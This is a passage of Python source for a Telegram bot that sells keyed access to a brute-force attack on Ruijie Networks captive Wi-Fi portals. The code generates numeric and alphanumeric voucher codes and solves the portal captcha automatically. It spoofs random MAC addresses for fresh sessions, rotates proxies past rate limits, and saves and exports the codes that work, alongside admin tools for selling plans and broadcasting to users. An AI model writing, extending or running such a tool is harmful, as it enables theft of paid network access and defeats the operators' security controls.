            f"{emoji} Proxy Status: {status_text}"
        )
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_main_keyboard(user_id))
        await bot.answer_callback_query(call.id, f"\u2705 Proxy {status_text}")
        return
    if call.data.startswith("admin_"):
        if not is_admin(str(chat_id)):
            await bot.answer_callback_query(call.id, "\u274C Admin only")
            return
        if call.data == "admin_back":
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text="\U0001F510 **Admin Panel**", reply_markup=get_admin_main_keyboard(), parse_mode="Markdown")
            await bot.answer_callback_query(call.id); return
        if call.data == "admin_genkey":
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text="\U0001F511 **Select Key Plan**", reply_markup=get_admin_genkey_keyboard(), parse_mode="Markdown")
            await bot.answer_callback_query(call.id); return
        if call.data == "admin_gen_30m":
            await handle_genkey_plan_selection(chat_id, call.message, "30m"); await bot.answer_callback_query(call.id); return
        if call.data == "admin_gen_1h":
            await handle_genkey_plan_selection(chat_id, call.message, "1h"); await bot.answer_callback_query(call.id); return
        if call.data == "admin_gen_1d":
            await handle_genkey_plan_selection(chat_id, call.message, "1d"); await bot.answer_callback_query(call.id); return
        if call.data == "admin_gen_7d":
            await handle_genkey_plan_selection(chat_id, call.message, "7d"); await bot.answer_callback_query(call.id); return
        if call.data == "admin_gen_1m":
            await handle_genkey_plan_selection(chat_id, call.message, "1m"); await bot.answer_callback_query(call.id); return
        if call.data == "admin_gen_1y":
            await handle_genkey_plan_selection(chat_id, call.message, "1y"); await bot.answer_callback_query(call.id); return
        if call.data == "admin_gen_unlimited":
            await handle_genkey_plan_selection(chat_id, call.message, "unlimited"); await bot.answer_callback_query(call.id); return
        if call.data == "admin_delkey":
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text="\U0001F5D1\uFE0F **Delete Key**\n\n`/delkey [key]`", reply_markup=get_admin_back_keyboard(), parse_mode="Markdown")
            await bot.answer_callback_query(call.id); return
        if call.data == "admin_listkeys":
            await bot.answer_callback_query(call.id); await listkeys_command(call.message); return
        if call.data == "admin_stats":
            await bot.answer_callback_query(call.id); await stats_command(call.message); return
        if call.data == "admin_broadcast":
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text="\U0001F4E2 `/sendall [your_message]`", reply_markup=get_admin_back_keyboard(), parse_mode="Markdown")
            await bot.answer_callback_query(call.id); return
        if call.data == "admin_users":
            await bot.answer_callback_query(call.id); await users_list_command(call.message); return
    if call.data == "menu_back":
        proxy_enabled = db_get_proxy_setting(user_id)
        status_text = "ON" if proxy_enabled else "OFF"
        emoji = "\U0001F7E2" if proxy_enabled else "\U0001F534"
        info = get_user_key_info(user_id)
        key_line = f"\U0001F511 Plan: {info['plan']} | \u23F0 {format_key_expiry(info['expires_at'])}" if info else "\U0001F511 Admin"
        text = (
            "\u2728 STAR LINK CODE HACK \u2728\n\n"
            f"\U0001F464 NAME: {user_name}\n"
            f"\U0001F194 USER ID: {user_id}\n\n"
            "\u2705 UNLOCKED\n"
            f"{key_line}\n"
            f"{emoji} Proxy Status: {status_text}"
        )
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_main_keyboard(user_id))
        await bot.answer_callback_query(call.id); return
    if call.data == "menu_free_trial":
        text = ("\U0001F517 Portal URL:\n\n/portal [your_portal_url]\n\n"
                "/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00")
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id); return
    if call.data == "menu_paid":
        info = get_user_key_info(user_id)
        if info:
            key_line = f"\U0001F511 Key: `{info['key']}`\n\U0001F4CB Plan: {info['plan']}\n\u23F0 Exp: {format_key_expiry(info['expires_at'])}\n\U0001F522 Limit: {info['code_limit']}"
        else:
            key_line = "\U0001F511 Admin Access"
        text = f"\u2705 YOUR ACCOUNT\n\nUSER ID: {user_id}\n\n{key_line}"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_paid_keyboard())
        await bot.answer_callback_query(call.id); return
    if call.data == "menu_enter_key":
        await bot.send_message(chat_id, "\U0001F511 Key:\n\n`/key YOUR_KEY_HERE`", parse_mode="Markdown")
        await bot.answer_callback_query(call.id); return
    if call.data == "menu_result":
        results = db_get_results(user_id)
        if results:
            codes = "\n".join(results)
            text = f"\u2705 Found Codes:\n{codes}"
        else:
            text = "\U0001F4CB success code \u1019\u101B\u103E\u102D\u101E\u1031\u1038\u1015\u102B\u104B"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id); return
    if call.data == "menu_recheck":
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text="\U0001F517 Portal URL:\n\n/portal [URL]", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id); return
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
            text="\U0001F504 Recheck \u1005\u1010\u1004\u103A\u1014\u1031\u1015\u102B\u101E\u100A\u103A...", reply_markup=get_scam_button_keyboard())
        await recheck_command(call.message)
        await bot.answer_callback_query(call.id); return
    if call.data == "menu_stop":
        await stop_scan_command(call.message)
        await bot.answer_callback_query(call.id, "\U0001F6D1 \u101B\u1015\u103A\u101C\u102D\u102F\u1000\u103A\u1015\u102B\u1015\u103C\u102E", show_alert=True)
        return
    if call.data == "menu_start_scam":
        if chat_id not in user_data or 'selected_mode' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text="\u274C VOUCHER \u1021\u101B\u1004\u103A\u101B\u103D\u1031\u1038\u1015\u102B\u104B", reply_markup=get_voucher_keyboard())
            await bot.answer_callback_query(call.id); return
        mode = user_data[chat_id]['selected_mode']
        start_digit = user_data[chat_id].get('start_digit')
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text="\U0001F517 Portal URL:\n\n/portal [URL]", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id); return
        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text="Scan \u101C\u100A\u103A\u1015\u1010\u103A\u1014\u1031\u1015\u103C\u102E\u104B", reply_markup=get_scam_button_keyboard())
            await bot.answer_callback_query(call.id); return
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
            text=f"\U0001F50D Scan \u1005\u1010\u1004\u103A\u1014\u1031\u1015\u102B\u101E\u100A\u103A...\n\n\U0001F522 Mode: {mode}",
            reply_markup=get_scam_button_keyboard(), parse_mode="Markdown")
        progress_msg = await bot.send_message(chat_id, "\U0001F50D Scanning...\n\n")
        scan_id = str(uuid.uuid4())
        portal_url = user_data[chat_id].get('session_url', 'Unknown')
        await forward_to_channel(f"\U0001F680 **Scan Started**\n\n\U0001F464 {user_name}\n\U0001F194 `{user_id}`\n\U0001F522 Mode: {mode}\n\U0001F517 `{portal_url}`", parse_mode="Markdown")
        task = asyncio.create_task(run_bruteforce(
            mode, chat_id, user_data[chat_id]['session_url'], scan_id,
            message=call.message, progress_msg=progress_msg, start_digit=start_digit))
        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
        await bot.answer_callback_query(call.id); return
    if call.data.startswith("scan_"):
        mode = call.data.replace("scan_", "")
        if chat_id not in user_data:
            user_data[chat_id] = {}
        if 'session_url' not in user_data[chat_id]:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text="\U0001F517 Portal URL:\n\n/portal [URL]", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id); return
        if mode in ["6", "7", "8"]:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text=f"\U0001F522 VOUCHER {mode} \u2014", reply_markup=get_digit_keyboard(mode))
            await bot.answer_callback_query(call.id); return
        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None
        text = f"\U0001F50D Mode: {mode}\n\n\u2705 START SCAM"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_start_scam_keyboard())
        await bot.answer_callback_query(call.id); return
    if call.data.startswith("digit_"):
        parts = call.data.split("_")
        mode = parts[1]; digit = parts[2]
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None if digit == "random" else digit
        text = f"\U0001F50D Mode: {mode}\n"
        if digit == "random":
            text += "\U0001F522 Random"
        else:
            text += f"\U0001F522 Digit: {digit}"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
            text=text + "\n\n\u2705 START SCAM", reply_markup=get_start_scam_keyboard())
        await bot.answer_callback_query(call.id); return

async def handle_genkey_plan_selection(chat_id, message, plan):
    if chat_id not in user_data:
        user_data[chat_id] = {}
    user_data[chat_id]['admin_gen_plan'] = plan
    await bot.edit_message_text(chat_id=chat_id, message_id=message.message_id,
        text=f"\U0001F511 **Plan: {plan}**\n\n`/genkey {plan} [code_limit] [user_id]`",
        reply_markup=get_admin_back_keyboard(), parse_mode="Markdown")

async def listkeys_command(message):
    try:
        keys = db_get_all_keys()
        if not keys:
            await bot.reply_to(message, "\U0001F4CB Key \u1019\u101B\u103E\u102D\u101E\u1031\u1038\u1015\u102B\u104B"); return
        lines = []
        for key, data in keys.items():
            user_info = db_get_user_by_key(key)
            user_id = user_info["user_id"] if user_info else "Not Registered"
            if data["expires_at"] == "9999-12-31T23:59:59Z":
                expires_str = "\u267E\uFE0F Unlimited"
            else:
                try:
                    exp_dt = datetime.fromisoformat(data["expires_at"].replace("Z", "+00:00"))
                    now = datetime.now(timezone.utc)
                    if exp_dt < now:
                        expires_str = "\u274C Expired"
                    else:
                        diff = exp_dt - now
                        expires_str = f"{diff.days}d left"
                except:
                    expires_str = data["expires_at"]
            lines.append(f"\U0001F511 `{key}`\n   \U0001F464 {user_id}\n   \U0001F4CB {data['plan']}\n   \u23F0 {expires_str}")
        text = f"\U0001F4CB Keys ({len(keys)})\n\n" + "\n\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096], parse_mode="Markdown")
        else:
            await bot.reply_to(message, text, parse_mode="Markdown")
    except Exception as e:
        print(f"Error at listkeys {e}")

async def stats_command(message):
    keys = db_get_all_keys(); users = db_get_all_users()
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(message,
        f"\U0001F4CA **Bot Statistics**\n\n\u23F1 Uptime: {hours}h {minutes}m\n"
        f"\U0001F50D Active Scans: {active_scans}\n\U0001F511 Total Keys: {len(keys)}\n"
        f"\U0001F465 Users: {len(users)}\n\U0001F4E6 Sessions: {len(user_data)}\n"
        f"\u26A1 Speed: {MAX_CONCURRENT} concurrent", parse_mode="Markdown")

async def users_list_command(message):
    users = db_get_all_users()
    if not users:
        await bot.reply_to(message, "\U0001F465 User \u1019\u101B\u103E\u102D\u101E\u1031\u1038\u1015\u102B\u104B"); return
    lines = [f"\U0001F464 `{uid}`" for uid in users[:100]]
    text = f"\U0001F465 **Users** ({len(users)})\n\n" + "\n".join(lines)
    if len(text) > 4096:
        for i in range(0, len(text), 4096):
            await bot.send_message(message.chat.id, text[i:i+4096], parse_mode="Markdown")
    else:
        await bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if not is_admin(str(message.chat.id)):
        await bot.reply_to(message, "No Permission"); return
    try:
        args = message.text.split()
        if len(args) < 4:
            await bot.reply_to(message, "Usage:\n/genkey [plan] [code_limit] [user_id]"); return
        plan = args[1]
        try:
            code_limit = int(args[2])
        except ValueError:
            await bot.reply_to(message, "\u274C Code limit must be a number"); return
        user_id = args[3]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(message, "\u274C Invalid plan"); return
        new_key = generate_random_key(12)
        db_add_key(new_key, user_id, plan, expiry, code_limit)
        await bot.reply_to(message,
            f"\u2705 Key Generated!\n\n\U0001F511 `{new_key}`\n\U0001F464 `{user_id}`\n\U0001F4CB {plan}\n\U0001F522 {code_limit}",
            parse_mode="Markdown")
    except Exception as e:
        print(f"Error at genkey {e}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if not is_admin(str(message.chat.id)):
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage: /delkey [key]"); return
        key = args[1]
        if not db_get_key(key):
            await bot.reply_to(message, f"\u274C Key {key} not found"); return
        db_delete_key(key)
        await bot.reply_to(message, f"\u2705 Deleted: {key}")
    except Exception as e:
        print(f"Error at delkey {e}")

@bot.message_handler(commands=['sendall'])
async def send_all_broadcast(message):
    if not is_admin(str(message.chat.id)):
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /sendall [message]"); return
    broadcast_text = f"\U0001F4E2 ADMIN NOTIFICATION\n\n{args[1]}"
    users = db_get_all_users()
    count = 0
    for uid in users:
        try:
            await bot.send_message(int(uid), broadcast_text)
            count += 1
            await asyncio.sleep(0.1)
        except:
            continue
    await bot.reply_to(message, f"\u2705 Sent to {count} users")

@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    user_id = str(message.chat.id)
    if not user_is_authenticated(user_id):
        await require_key_message(message); return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "\U0001F517 /portal [your_portal_url]"); return
    
    url = args[1].strip()
    
    if "ruijienetworks.com" in url:
        if message.chat.id not in user_data:
            user_data[message.chat.id] = {}
        user_data[message.chat.id]['session_url'] = url
        await bot.reply_to(message, "\u2705 Portal URL \u101E\u102D\u1019\u103A\u1038\u1015\u103C\u102E\u1038\u104B\n\nVOUCHER \u101B\u103D\u1031\u1038\u1015\u102B:", reply_markup=get_voucher_keyboard())
    else:
        await bot.reply_to(message, "\u274C Portal URL \u1019\u103E\u102C\u1038\u1014\u1031\u101E\u100A\u103A\u104B")

@bot.message_handler(commands=['scan'])
async def handle_key_scan(message):
    user_id = str(message.chat.id)
    if not user_is_authenticated(user_id):
        await require_key_message(message); return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "VOUCHER \u101B\u103D\u1031\u1038\u1015\u102B:", reply_markup=get_voucher_keyboard()); return
    mode = args[1]
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "Portal URL \u1021\u101B\u1004\u103A\u1011\u100A\u1037\u103A\u1015\u102B\u104B"); return
    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "Scan \u101C\u100A\u103A\u1015\u1010\u103A\u1014\u1031\u1015\u103C\u102E\u104B"); return
    progress_msg = await bot.send_message(chat_id, "\U0001F50D Scanning...\n\n")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(run_bruteforce(
        mode, chat_id, user_data[chat_id]['session_url'], scan_id,
        message=message, progress_msg=progress_msg))
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['stop'])
async def stop_scan_command(message):
    user_id = str(message.chat.id)
    if not user_is_authenticated(user_id):
        await require_key_message(message); return
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True; data["scan_id"] = None
        await send_success_file(chat_id)
        data["task"].cancel()
        success_messages.pop(chat_id, None); success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None); limited_texts.pop(chat_id, None)
        await bot.reply_to(message, "\U0001F6D1 Scan \u101B\u1015\u103A\u101C\u102D\u102F\u1000\u103A\u1015\u103C\u102E\u104B", reply_markup=get_back_keyboard())
    else:
        await bot.reply_to(message, "\u101B\u1015\u103A\u101B\u1014\u103A Scan \u1019\u101B\u103E\u102D\u1015\u102B\u104B", reply_markup=get_back_keyboard())

@bot.message_handler(commands=['result'])
async def handle_result(message):
    user_id = str(message.chat.id)
    if not user_is_authenticated(user_id):
        await require_key_message(message); return
    results = db_get_results(user_id)
    if results:
        codes = "\n".join(results)
        await bot.reply_to(message, f"\u2705 Found Codes:\n{codes}")
    else:
        await bot.reply_to(message, "Code \u1019\u101B\u103E\u102D\u101E\u1031\u1038\u1015\u102B\u104B")

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    user_id = str(message.chat.id)
    if not user_is_authenticated(user_id):
        await require_key_message(message); return
    chat_id = message.chat.id
    results = db_get_results(user_id)
    if not results:
        await bot.reply_to(message, "success code \u1019\u101B\u103E\u102D\u101E\u1031\u1038\u1015\u102B\u104B"); return
    if message.chat.id not in user_data or 'session_url' not in user_data.get(message.chat.id, {}):
        await bot.reply_to(message, "Portal URL \u1021\u101B\u1004\u103A\u1011\u100A\u1037\u103A\u1015\u102B\u104B"); return
    await bot.reply_to(message, f"Code {len(results)} \u1001\u102F \u1015\u103C\u1014\u103A\u1005\u1005\u103A\u1014\u1031\u101E\u100A\u103A...")
    session_url_recheck = user_data[message.chat.id]["session_url"]
    recheck_list = []
    for code in results:
        recode = await perform_check(session_url_recheck, code, chat_id, scan_id=None, recheck=True, message=message)
        if recode:
            recheck_list.append(recode)
    to_show = "\n".join(recheck_list) if recheck_list else "\u1021\u102C\u1038\u101C\u102F\u1036\u1038 \u1015\u103C\u1014\u103A\u1005\u1005\u103A\u1015\u103C\u102E\u1038\u1015\u102B\u1015\u103C\u102E\u104B"
    await bot.reply_to(message, f"\u2705 Rechecked:\n\n{to_show}")
    if recheck_list:
        db_save_results(user_id, recheck_list)

async def recheck_command(message):
    await recheck(message)

@bot.message_handler(commands=['status'])
async def status_command(message):
    if not is_admin(str(message.chat.id)):
        await bot.reply_to(message, "No Permission"); return
    await stats_command(message)

@bot.message_handler(commands=['proxy'])
async def proxy_command(message):
    user_id = str(message.chat.id)
    if not user_is_authenticated(user_id):
        await require_key_message(message); return
    current = db_get_proxy_setting(user_id)
    new_status = not current
    db_set_proxy_setting(user_id, new_status)
    status_text = "ON" if new_status else "OFF"
    emoji = "\U0001F7E2" if new_status else "\U0001F534"
    await bot.reply_to(message, f"{emoji} Proxy {status_text}")

@bot.message_handler(commands=['auth_status'])
async def auth_status_command(message):
    user_id = str(message.chat.id)
    if user_is_authenticated(user_id):
        await bot.reply_to(message, "\u2705 Unlocked")
    else:
        await bot.reply_to(message, "\U0001F510 Locked \u2014 /key YOUR_KEY")

# ==================== FILE EXPORT ====================

async def send_success_file(chat_id):
    st = scan_stats.get(chat_id)
    if not st or not st.get("hits"):
        return
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"success_codes_{chat_id}_{timestamp}.txt"
        lines = []
        for code, profile, dur in st["hits"]:
            lines.append(f"{code} : {profile}, {dur}")
        content = "\n".join(lines)
        with open(filename, "w", encoding="utf-8") as f:
            f.write(f"Success Codes Found\n")
            f.write(f"User ID: {chat_id}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total: {len(st['hits'])}\n")
            f.write(f"{'='*50}\n\n")
            f.write(content)
        with open(filename, "rb") as f:
            await bot.send_document(chat_id, f, caption=f"\u2705 Found {len(st['hits'])} codes")
        if os.path.exists(filename):
            os.remove(filename)
    except Exception as e:
        print(f"Error sending file: {e}")

# ==================== CORE SCANNING ====================

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6):
    return "".join(random.choice(strings_2) for _ in range(length))

strings_mixed = string.ascii_lowercase + string.digits
def mixed_generator(length=6):
    return "".join(random.choice(strings_mixed) for _ in range(length))

def iter_codes(mode, start_digit=None):
    if mode in ["6", "7", "8"]:
        length = int(mode)
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end = (int(start_digit) + 1) * (10 ** (length - 1))
            for i in range(start, end):
                yield str(i).zfill(length)
            return
        if mode in ["6", "7"]:
            codes = [str(i).zfill(length) for i in range(10 ** length)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "8":
            while True:
                yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    if mode == "mixed":
        while True:
            yield mixed_generator(6)
    if mode == "mixed8":
        while True:
            yield mixed_generator(8)
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, chat_id=None):
    speed_str = f"{speed:,.1f} c/m"
    proxy_count = len(PROXY_LIST)

    if chat_id is not None:
        st = _stats(chat_id)
    else:
        st = {"tried": checked, "expired": 0, "limits": 0, "errors": 0,
              "current_code": "", "hits": [], "start": time.monotonic()}

    elapsed = time.monotonic() - st.get("start", time.monotonic())
    hours, rem = divmod(int(elapsed), 3600)
    mins, secs = divmod(rem, 60)
    runtime_str = f"{hours:02d}:{mins:02d}:{secs:02d}"

    parts = []
    parts.append("\U0001F494\U0001F494 \u1001\u103B\u1005\u103A\u101B\u1004\u103A\u1016\u103D\u1004\u1037\u103A\u1015\u103C\u1031\u102C\u101C\u102D\u102F\u1000\u103A \U0001F494\U0001F494")
    parts.append("\U0001F494 SCANNER STOPPED \U0001F494")
    parts.append("\U0001F338 Thank by @iamtelegramlink \U0001F338")  # <--- ဤနေရာတွင် ပြောင်းထားသည်
    parts.append("\u2501" * 18)
    parts.append(f"\u23F1\uFE0F Runtime \u2794 {runtime_str}")
    parts.append(f"\U0001F4CA Tried \u2794 {checked:,}")
    parts.append(f"\U0001F389 Hits \u2794 {found}")
    parts.append(f"\u26A1 Speed \u2794 {speed_str}")
    parts.append(f"\U0001F500 Proxies \u2794 {proxy_count}/{proxy_count}")
    parts.append("\U0001F338 " + "\u2501" * 15 + " \U0001F338")
    parts.append("\U0001F381 ALL HIT CODES \U0001F381")
    parts.append("")

    if st["hits"]:
        for code, profile, dur in st["hits"]:
            parts.append("")
            parts.append(f"\U0001F381 {code}")
            parts.append(f"\U0001F48E {profile} \u2794 \u23F0 {dur} \U0001F310")

    parts.append("")
    parts.append("\U0001F338 " + "\u2501" * 15 + " \U0001F338")
    parts.append("\U0001F4AC Owner : @iamtelegramlink")  # <--- ဤနေရာတွင် ပြောင်းထားသည်

    text = "\n".join(parts)

    MAX_LEN = 4000
    if len(text) > MAX_LEN:
        text = text[:MAX_LEN - 100] + "\n\n... (+more hits)"

    return text

retries = 0

def _captcha_entry(chat_id):
    if chat_id not in captcha_state:
        captcha_state[chat_id] = {"session_id": None, "auth_code": None, "lock": asyncio.Lock()}
    return captcha_state[chat_id]

async def get_captcha(chat_id, session, session_url):
    entry = _captcha_entry(chat_id)
    if entry["session_id"] and entry["auth_code"]:
        return entry["session_id"], entry["auth_code"]
    async with entry["lock"]:
        if entry["session_id"] and entry["auth_code"]:
            return entry["session_id"], entry["auth_code"]
        session_id = await get_session_id(session, session_url, entry.get("session_id"))
        if not session_id:
            return None, None
        for _ in range(10):
            image = await Captcha_Image(session, session_id)
            text = await Captcha_Text(image)
            verified = await Varify_Captcha(session, session_id, text)
            if verified:
                entry["session_id"] = session_id
                entry["auth_code"] = text
                return session_id, text
        return None, None

def invalidate_captcha(chat_id):
    entry = _captcha_entry(chat_id)
    entry["session_id"] = None
    entry["auth_code"] = None

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None, start_digit=None):
    try:
        code_iter = iter_codes(mode, start_digit=start_digit)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    scan_stats[chat_id] = {
        "tried": 0, "expired": 0, "limits": 0, "errors": 0,
        "current_code": "", "hits": [], "start": time.monotonic()
    }
    if mode in ["6", "7"]:
        total = 10 ** int(mode)
    elif mode == "8":
        total = 10 ** 8
    else:
        total = None
    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(MAX_CONCURRENT)
    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                return
            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break
            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)
            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            checked += len(batch)
            found = len(success_texts.get(chat_id, []))
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            text = format_progress(checked, total, speed, found, chat_id=chat_id)
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except Exception as err:
                    print(f"Progress Error: {err}")
        if progress_msg:
            found = len(success_texts.get(chat_id, []))
            finish_text = format_progress(checked, total, 0, found, chat_id=chat_id)
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
            except:
                try:
                    await bot.send_message(chat_id, finish_text)
                except:
                    pass
        await send_success_file(chat_id)
        scan_tasks.pop(chat_id, None); success_messages.pop(chat_id, None); success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None); limited_texts.pop(chat_id, None)
    finally:
        await send_success_file(chat_id)
        scan_tasks.pop(chat_id, None); success_messages.pop(chat_id, None); success_texts.pop(chat_id, None)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

# ==================== NETWORK ====================

def get_base_url(session_url):
    match = re.search(r'https?://([^/]+)', session_url)
    if match:
        return f"https://{match.group(1)}"
    return "https://portal-as.ruijienetworks.com"

async def check_session_url(session_url, use_proxy=True):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    proxy = get_next_proxy() if use_proxy else None
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(session_url, allow_redirects=True, headers=headers, proxy=proxy) as response:
                return "sessionId" in str(response.url)
    except:
        return False

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
            return previous_session_id
    except:
        return previous_session_id

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector, retries
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return
            
    base_url = get_base_url(session_url)
    post_url = f"{base_url}/api/auth/voucher/?lang=en_US"
    
    response = None
    session_id = None
    for _attempt in range(2):
        timeout = aiohttp.ClientTimeout(total=TIMEOUT)
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(), timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url, None)
            if not session_id:
                return
            auth_code = None
            for _ in range(5):
                try:
                    image = await Captcha_Image(task_session, session_id, base_url)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text, base_url)
                    if verified:
                        auth_code = text
                        break
                except Exception as e:
                    print(f"[captcha] {e}")
            if not auth_code:
                return
            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return
            data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
            headers = {
                "authority": base_url.replace("https://", ""),
                "accept": "*/*", "content-type": "application/json",
                "origin": base_url,
                "referer": f"{base_url}/download/static/maccauth/src/index.html?sessionId={session_id}",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    resp_json = json.loads(response)
                    print(f"[voucher] {code} attempt={_attempt+1} status={req.status} resp={resp_json}")
            except Exception as e:
                print(f"[perform_check] {e}")
                retries += 1
                return
        if response and 'request limited' in response:
            retries += 1
            continue
        break
    if not response:
        return
